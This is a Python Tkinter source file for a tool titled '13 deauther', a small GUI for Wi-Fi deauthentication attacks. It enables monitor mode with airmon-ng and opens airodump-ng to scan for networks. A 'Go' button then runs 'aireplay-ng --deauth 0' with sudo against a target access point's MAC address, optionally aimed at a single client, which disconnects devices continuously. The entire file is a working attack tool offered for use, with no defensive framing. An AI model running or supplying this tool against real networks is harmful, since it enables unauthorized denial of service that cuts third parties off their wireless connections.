from tkinter import *
import subprocess
import time
import keyboard
import ifcfg
import json

wific = [""]

for name, interface in ifcfg.interfaces().items():
    wific.append(interface['device'])


def deauth():

    def go1():
        w = str(varible.get())
        y = len(mac.get())
        x = mac.get()
        z = chn.get()
        k = len(chn.get())
        j = len(use.get())
        c = use.get()

        if y == 0:
            txt2.configure(fg="#eeff05")
            txt3.configure(fg="#d000ff", text="Error!")
        elif k == 0:
            txt2.configure(fg="#eeff05")
            txt3.configure(fg="#d000ff", text="Error!")

        elif j == 0:
            btn.configure(bg="#d000ff")
            channel = subprocess.Popen(
                ['sudo', 'iwconfig', w, 'channel', z])
            haha = subprocess.Popen(
                ['sudo', 'aireplay-ng', '--deauth', '0', '-a', x, w])
            if haha:
                txt3.config(fg="GREEN", text="Working!")
            else:
                txt3.config(fg="#d000ff", text="Error!!")

        else:
            btn.configure(bg="#d000ff")

            channel = subprocess.Popen(
                ['sudo', 'iwconfig', w, 'channel', z])
            haha = subprocess.Popen(
                ['sudo', 'aireplay-ng', '--deauth', '0', '-a', x, '-c', c, w])
            if haha:
                txt3.config(fg="GREEN", text="Working!")
            else:
                txt3.config(fg="#d000ff", text="Error!!")

    def go2():
        w = str(varible.get())
        mon = subprocess.Popen(
            ['xfce4-terminal', '-x', 'airmon-ng', 'start', w])
        time.sleep(2)
        wific = [""]
        for name, interface in ifcfg.interfaces().items():
            wific.append(interface['device'])
        varible.set(wific[0])
        wificard = OptionMenu(window, varible, *wific)
        wificard.pack()
        wificard.config(width=15, bg="#4800ff", highlightthickness=0, fg="#d000ff", activebackground="#4800ff", activeforeground="#d000ff")
        wificard["menu"].config(bg="#4800ff", fg="#d000ff", activebackground="#4800ff", activeforeground="#d000ff")
        wificard.place(x=95, y=138)

    def go3():
        w = str(varible.get())
        scan = subprocess.Popen(['xfce4-terminal','-x','airodump-ng',w])
        
        
    window = Tk()
    window.title("13 deauther")
    window.geometry("300x200+10+20")
    window.configure(bg="#4800ff")

    btn = Button(window, text="Go  ", fg="black", bg="#d000ff", borderwidth=0,
                 activebackground="#d000ff", highlightthickness=0, command=go1)
    btn.place(x=240, y=21)

    btn3 = Button(window, text="SC  ", fg="black", bg="#d000ff", borderwidth=0,
                  activebackground="#d000ff", highlightthickness=0, command=go3)
    btn3.place(x=240, y=61)

    btn2 = Button(window, text="MM", fg="black", bg="#d000ff", borderwidth=0,
                  activebackground="#d000ff", highlightthickness=0, command=go2)
    btn2.place(x=240, y=101)

    mac = Entry(window, width=15, bg="#4800ff", highlightthickness=0, fg="#d000ff")
    mac.place(x=75, y=24)

    chn = Entry(window, width=15, bg="#4800ff", highlightthickness=0, fg="#d000ff")
    chn.place(x=75, y=64)

    use = Entry(window, width=15, bg="#4800ff", highlightthickness=0, fg="#d000ff")
    use.place(x=75, y=104)

    varible = StringVar(window)
    varible.set(wific[0])

    wificard = OptionMenu(window, varible, *wific)
    wificard.pack()
    wificard.config(width=15, bg="#4800ff", highlightthickness=0, fg="#d000ff", activebackground="#d000ff")
    wificard["menu"].config(bg="#4800ff", fg="#d000ff", activebackground="#4800ff", activeforeground="#d000ff")
    wificard.place(x=95, y=138)

    txt1 = Label(window, text="Address:", fg="#d000ff", bg="#4800ff")
    txt1.place(x=7, y=23.3)

    txt2 = Label(window, text="STATUS:", fg="#eeff05", bg="#4800ff")
    txt2.place(x=30, y=170)

    txt3 = Label(window, fg="#4800ff", bg="#4800ff")
    txt3.place(x=100, y=170)

    txt4 = Label(window, text="Channel:", fg="#d000ff", bg="#4800ff")
    txt4.place(x=7, y=63.3)

    txt5 = Label(window, text="Client:", fg="#d000ff", bg="#4800ff")
    txt5.place(x=7, y=103.3)

    txt6 = Label(window, text="WIFI-CARD:", fg="#d000ff", bg="#4800ff")
    txt6.place(x=7, y=143.3)

    window.mainloop()
